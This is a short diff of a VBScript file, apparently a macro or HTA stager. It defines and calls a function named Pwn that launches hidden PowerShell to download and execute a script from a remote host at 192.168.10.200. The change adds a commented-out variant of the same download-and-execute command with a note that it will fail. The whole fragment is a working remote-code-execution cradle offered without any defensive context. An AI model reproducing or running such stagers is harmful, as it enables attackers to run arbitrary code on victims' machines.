@@ -59,6 +59,7 @@
     Function Pwn()
       Set shell = CreateObject("wscript.Shell")
       shell.exec "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
+      ' This will fail -> shell.exec "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.10.200:80/tempOld'))"""
     End Function
 
     Pwn
